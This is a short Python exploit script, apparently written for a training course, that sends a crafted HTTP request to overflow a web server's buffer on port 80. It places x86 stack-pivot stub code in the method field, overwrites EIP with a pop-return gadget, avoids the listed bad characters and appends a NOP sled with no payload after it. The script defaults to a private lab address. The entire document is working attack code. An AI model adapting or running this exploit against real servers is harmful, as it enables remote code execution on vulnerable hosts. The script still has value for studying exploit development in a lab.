#!/usr/bin/env python3

import socket
import sys
import subprocess
from struct import pack

try:
    if len(sys.argv) < 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]
    port = 80
    size = 260
    bad_char_values = b"\x00\x25\x0a\x0d"
    eip_offset = 253

    # Jump to the first stage.
    httpMethod = b"\x83\xC4\x46"  # add esp,byte +0x45
    httpMethod += b"\x83\xC4\x23"  # add esp,byte +0x23
    httpMethod += b"\x54"  # push esp"
    httpMethod += b"\xC3"  # ret
    httpMethod += b" /"

    # Jump to payload.
    # Future Kaitlyn: Oops, I got too far ahead. They want me to use an egg hunter instead.
    # This is just an alternate solution.
    inputBuffer = b"\x89\xE0"  # mov eax,esp
    inputBuffer += b"\x66\x05\xA3\x14"  # add ax,0x14a3
    inputBuffer += b"\x8B\x18"  # mov ebx,[eax]
    inputBuffer += b"\x66\x81\xC3\x0E\x01"  # add bx,0x10e
    inputBuffer += b"\x89\xDC"  # mov esp,ebx
    inputBuffer += b"\xFF\xE3"  # jmp ebx
    inputBuffer += b"\x41" * (eip_offset - len(inputBuffer))

    # EIP control To pop return -> 0x0041eb74
    inputBuffer += b"\x74\xeb\x41"

    httpEndRequest = b"\r\n\r\n"

    # Payload
    httpEndRequest += b"\x90" * 32 # NOP sled

    buf = httpMethod + inputBuffer + httpEndRequest

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")